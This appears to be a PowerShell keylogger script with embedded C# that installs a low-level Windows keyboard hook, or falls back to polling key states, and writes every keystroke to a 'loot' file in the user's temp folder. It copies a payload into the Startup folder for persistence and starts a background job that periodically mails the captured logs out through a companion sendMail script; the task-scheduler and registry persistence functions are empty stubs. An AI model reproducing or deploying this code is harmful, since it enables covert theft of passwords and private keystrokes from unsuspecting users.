[CmdletBinding()]
Param (
	[Parameter(Mandatory = $false)]
	[ValidateSet($True, "Startup", "TaskScheduler", "Registry", "All")]
	[string]$Type = "Startup"
)


$validPersistanceTypes = "Startup", "TaskScheduler", "Registry", "All"
$sendMailPath = "$PWD\sendMail.ps1";

function Check-DotNetFramework {
    $dotNetKey = 'HKLM:\SOFTWARE\Microsoft\NET Framework Setup\NDP\v4\Full'
    $dotNetVersion = $null

    if (Test-Path $dotNetKey) {
        $version = (Get-ItemProperty -Path $dotNetKey -Name Release).Release
        $dotNetVersion = $version
    }

    # .NET Framework 4.0 and later versions have a release value >= 379893
    if ($dotNetVersion -ge 379893) {
		#Write-Host ".NET Version: $dotNetVersion"
        return $true
    }
    
    return $false
}

function KeyLog {
	if (Check-DotNetFramework) {
		#Write-Host ".NET Framework is present."
		ComplexKeyLog
	} else {
		#Write-Host ".NET Framework is not present."
		SimpleKeyLog
	}
}

function ComplexKeyLog($LogFile="$env:temp\$env:username.log") {
	$LootFile = New-Item -Path $LogFile -ItemType File -Force
	$source = @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;

namespace KeyLogger {
  public static class Program {
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
	private const int VK_RETURN = 0x0D;  // Enter key
	private const int VK_SPACE = 0x20;   // Spacebar
	private const int VK_OEM_PERIOD = 0xBE;   // For any country/region, the "." key
	private const int VK_LSHIFT = 0xA0;   
	private const int VK_RSHIFT = 0xA1;   
	private const int VK_CAPITAL = 0x14;   
	private const int VK_BACK = 0x08;
	private const int VK_TAB = 0x09;
	private const int VK_LEFT = 0x25;
	private const int VK_UP = 0x26;
	private const int VK_RIGHT = 0x27;
	private const int VK_DOWN = 0x28;
	private const int VK_DELETE = 0x2E;

    private static StreamWriter logFile;

    private static HookProc hookProc = HookCallback;
    private static IntPtr hookId = IntPtr.Zero;

    public static void Main(string[] args) {
	  if (args.Length > 0) {
		string logFileName = args[0];
		// Console.WriteLine("Writing keys to " + logFileName);
	  	logFile = File.AppendText(logFileName);
      	logFile.AutoFlush = true;

      	hookId = SetHook(hookProc);
      	Application.Run();
      	UnhookWindowsHookEx(hookId);
	} else {
			Console.WriteLine("No log file path provided."); 
		}
    }

    private static IntPtr SetHook(HookProc hookProc) {
      IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
      return SetWindowsHookEx(WH_KEYBOARD_LL, hookProc, moduleHandle, 0);
    }

    private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
      if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN) {
        int vkCode = Marshal.ReadInt32(lParam);

		bool shiftPressed = (GetAsyncKeyState(VK_LSHIFT) & 0x8000) != 0 || (GetAsyncKeyState(VK_RSHIFT) & 0x8000) != 0;
        bool capsLockActive = (GetKeyState(VK_CAPITAL) & 0x0001) != 0;

		string keyChar;

		if (vkCode >= (int)Keys.A && vkCode <= (int)Keys.Z) { // Alphabet characters
			if (shiftPressed ^ capsLockActive) 
			{
				keyChar = ((char)vkCode).ToString().ToUpper();
			} 
			else 
			{
				keyChar = ((char)vkCode).ToString().ToLower();
			}
			logFile.Write(keyChar);
		} else if (vkCode >= 96 && vkCode <= 111) { // Number pad characters
			switch(vkCode) {
			case 96: keyChar = "0"; break;
			case 97: keyChar = "1"; break;
			case 98: keyChar = "2"; break;
			case 99: keyChar = "3"; break;
			case 100: keyChar = "4"; break;
			case 101: keyChar = "5"; break;
			case 102: keyChar = "6"; break;
			case 103: keyChar = "7"; break;
			case 104: keyChar = "8"; break;
			case 105: keyChar = "9"; break;
			case 106: keyChar = "*"; break;
			case 107: keyChar = "+"; break;
			case 108: keyChar = "|"; break;
			case 109: keyChar = "-"; break;
			case 110: keyChar = "."; break;
			case 111: keyChar = "/"; break;
			default: keyChar = ((char)vkCode).ToString(); break;
			} 
			logFile.Write(keyChar);	
		} else if ( (vkCode >= 48 && vkCode <= 57) || (vkCode >= 186 && vkCode <= 192) || (vkCode >= 219 && vkCode <= 222) ) {
			if (shiftPressed) {
			    switch (vkCode) {
			    case 48: keyChar = ")"; break;
			    case 49: keyChar = "!"; break;
			    case 50: keyChar = "@"; break;
			    case 51: keyChar = "#"; break;
			    case 52: keyChar = "$"; break;
			    case 53: keyChar = "%"; break;
			    case 54: keyChar = "^"; break;
			    case 55: keyChar = "&"; break;
			    case 56: keyChar = "*"; break;
			    case 57: keyChar = "("; break;
			    case 186: keyChar = ":"; break;
			    case 187: keyChar = "+"; break;
			    case 188: keyChar = "<"; break;
			    case 189: keyChar = "_"; break;
			    case 190: keyChar = ">"; break;
			    case 191: keyChar = "?"; break;
			    case 192: keyChar = "~"; break;
			    case 219: keyChar = "{"; break;
			    case 220: keyChar = "|"; break;
			    case 221: keyChar = "}"; break;
			    case 222: keyChar = "<Double Quotes>"; break;
				default: keyChar = ((char)vkCode).ToString(); break;
			    }
			} else {
			    switch(vkCode) {
			    case 48: keyChar = "0"; break;
			    case 49: keyChar = "1"; break;
			    case 50: keyChar = "2"; break;
			    case 51: keyChar = "3"; break;
			    case 52: keyChar = "4"; break;
			    case 53: keyChar = "5"; break;
			    case 54: keyChar = "6"; break;
			    case 55: keyChar = "7"; break;
			    case 56: keyChar = "8"; break;
			    case 57: keyChar = "9"; break;
			    case 186: keyChar = ";"; break;
			    case 187: keyChar = "="; break;
			    case 188: keyChar = ","; break;
			    case 189: keyChar = "-"; break;
			    case 190: keyChar = "."; break;
			    case 191: keyChar = "/"; break;
			    case 192: keyChar = "``"; break;
			    case 219: keyChar = "["; break;
			    case 220: keyChar = "\\"; break;
			    case 221: keyChar = "]"; break;
			    case 222: keyChar = "<Single Quote>"; break;
				default: keyChar = ((char)vkCode).ToString(); break;
				}	
			}
			logFile.Write(keyChar);
		} else { 
		 switch (vkCode) {
           case (int)Keys.F1: logFile.Write("<F1>"); break;
           case (int)Keys.F2: logFile.Write("<F2>"); break;
           case (int)Keys.F3: logFile.Write("<F3>"); break;
           case (int)Keys.F4: logFile.Write("<F4>"); break;
           case (int)Keys.F5: logFile.Write("<F5>"); break;
           case (int)Keys.F6: logFile.Write("<F6>"); break;
           case (int)Keys.F7: logFile.Write("<F7>"); break;
           case (int)Keys.F8: logFile.Write("<F8>"); break;
           case (int)Keys.F9: logFile.Write("<F9>"); break;
           case (int)Keys.F10: logFile.Write("<F10>"); break;
           case (int)Keys.F11: logFile.Write("<F11>"); break;
           case (int)Keys.F12: logFile.Write("<F12>"); break;
           case (int)Keys.PrintScreen: logFile.Write("<Print Screen>"); break;
           case (int)Keys.Scroll: logFile.Write("<Scroll Lock>"); break;
           case (int)Keys.Pause: logFile.Write("<Pause/Break>"); break;
           case (int)Keys.Insert: logFile.Write("<Insert>"); break;
           case (int)Keys.Home: logFile.Write("<Home>"); break;
           case (int)Keys.End: logFile.Write("<End>"); break;
           case (int)Keys.PageUp: logFile.Write("<Page Up>"); break;
           case (int)Keys.PageDown: logFile.Write("<Page Down>"); break;
           case (int)Keys.Escape: logFile.Write("<Esc>"); break;
           case (int)Keys.NumLock: logFile.Write("<Num Lock>"); break;
           case (int)Keys.Capital: break;
           case (int)Keys.Tab: logFile.Write("<Tab>"); break;
           case (int)Keys.Back: logFile.Write("<Backspace>"); break;
           case (int)Keys.Delete: logFile.Write("<Delete>"); break;
           case (int)Keys.Enter: logFile.WriteLine(""); break;
           case (int)Keys.Space: logFile.Write(" "); break;
           case (int)Keys.Left: logFile.Write("<Left>"); break;
           case (int)Keys.Up: logFile.Write("<Up>"); break;
           case (int)Keys.Right: logFile.Write("<Right>"); break;
           case (int)Keys.Down: logFile.Write("<Down>"); break;
           case (int)Keys.LMenu:
           case (int)Keys.RMenu: logFile.Write("<Alt>"); break;
           case (int)Keys.LWin:
           case (int)Keys.RWin: logFile.Write("<Windows Key>"); break;
           case (int)Keys.LShiftKey:
           case (int)Keys.RShiftKey: break;
           case (int)Keys.LControlKey:
           case (int)Keys.RControlKey: logFile.Write("<Ctrl>"); break;
           default: logFile.Write("<KEY_" + vkCode + ">"); break;
                    }
			}	
      }

      return CallNextHookEx(hookId, nCode, wParam, lParam);
    }

    [DllImport("user32.dll")]
    private static extern IntPtr SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll")]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll")]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

	[DllImport("user32.dll")]
	private static extern int MapVirtualKey(uint uCode, uint uMapType);

    [DllImport("user32.dll")]
    private static extern short GetAsyncKeyState(int vKey);

    [DllImport("user32.dll")]
    private static extern short GetKeyState(int vKey);

    [DllImport("kernel32.dll")]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
  }
}
"@
Add-Type -TypeDefinition $source -ReferencedAssemblies System.Windows.Forms
$logFileName = "$env:temp\$env:username.log"
[KeyLogger.Program]::Main($logFileName);
}

function SimpleKeyLog($LogFile="$env:temp\$env:username.log") {
	$LootFile = New-Item -Path $LogFile -ItemType File -Force

	$APIsigs = @"
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern short GetAsyncKeyState(int virtualKeyCode);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int GetKeyboardState(byte[] keystate);
[DllImport("user32.dll", CharSet=CharSet.Auto)]
public static extern int MapVirtualKey(uint uCode, int uMapType);
[DllImport("user32.dll", CharSet=CharSet.Auto, ExactSpelling=true)]
public static extern int ToUnicode(uint wVirtKey, uint wScanCode, byte[] lpkeystate, System.Text.StringBuilder pwszBuff, int cchBuff, uint wFlags);
"@
	$TypeName = "Win32_" + [guid]::NewGuid().ToString("N")
	$API = Add-Type -MemberDefinition $APIsigs -Name $TypeName -Namespace "API" -PassThru

	$LogBuilder = New-Object -TypeName System.Text.StringBuilder
	# The idea is to continuously scan each key and check whether it is pressed or not. Not the most accurate, but the simplest
	try {
		while ($true) {
			# Capture keystroke logic
			Start-Sleep -Milliseconds 80
			for ($ascii = 0; $ascii -le 254; $ascii++) {
				$KeyState = $API::GetAsyncKeyState($ascii)
				if (($KeyState -band 0x8000) -ne 0) { # Highest bit toggled means key pressed
					$hideLogBuilderOutput = $LogBuilder.Clear()
					$KeyboardState = New-Object Byte[] 256
					$storeAndHideState = $API::GetKeyboardState($KeyboardState)
					$mapKey = $API::MapVirtualKey($ascii, 3)
                    $result = $API::ToUnicode($ascii, $mapKey, $KeyboardState, $LogBuilder, $LogBuilder.Capacity, 0)

					if ($result -gt 0) {
						$character = $LogBuilder.ToString()

						if ($ascii -eq 13) { # Enter key
							Add-Content -Path $LootFile -Value "`r`n"
						} else {
						Add-Content -Path $LootFile -Value $character -NoNewline
						}
					}

				}		
			}

		}
	} 
	catch {
		#Write-Error "An error occured: $_"
	}	
	finally {
		#Write-Host "Finally reached: $_"
		SendMail
	}
}

function persistStartup() {
	
	$trigger = "payload.cmd"
	$triggerPath = "$PWD\$trigger"
	$triggerDestinationPath = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\$trigger"	
	Copy-Item -Path $triggerPath -Destination $triggerDestinationPath -Force

	$script = "keyLogger.ps1"
	$scriptPath = "$PWD\$script"
	$scriptDestinationPath = "$env:TEMP\$script"	
	Copy-Item -Path $scriptPath -Destination $scriptDestinationPath -Force
	
	$scheduler = "sendMail.ps1"
	$schedulerPath = "$PWD\$scheduler"
	$schedulerDestinationPath = "$env:TEMP\$scheduler"	
	Copy-Item -Path $schedulerPath -Destination $schedulerDestinationPath -Force
	
}

function persistTaskScheduler() {
	
}

function persistRegistry() {
}

function persistAll() {
	persistStartup
	persistTaskScheduler
	persistRegistry
}


function CreatePersistance($Type) {
	
	
	switch ($Type) {
			
		"Startup" {
			# Place your specific logic for Startup here
			#Write-Host "[DEBUG][Persistance] Persisting startup."
			persistStartup
		}
		"TaskScheduler" {
			# Place your specific logic for TaskScheduler here
			persistTaskScheduler
		}
		"Registry" {
			# Place your specific logic for Registry here
			persistRegistry
		}
		"All" {
			# Place your specific logic for Registry here
			persistAll
		}
		default {
			#Write-Host "Unknown option selected."
		}
	}
	
	
}

Start-Job -ScriptBlock {
	. $using:sendMailPath
	SendMail
	ScheduleMail -MinutesInterval $Interval
	} -InitializationScript { 
				$ProgressPreference = 'SilentlyContinue'; 
				} | Out-Null

CreatePersistance -Type $Type
KeyLog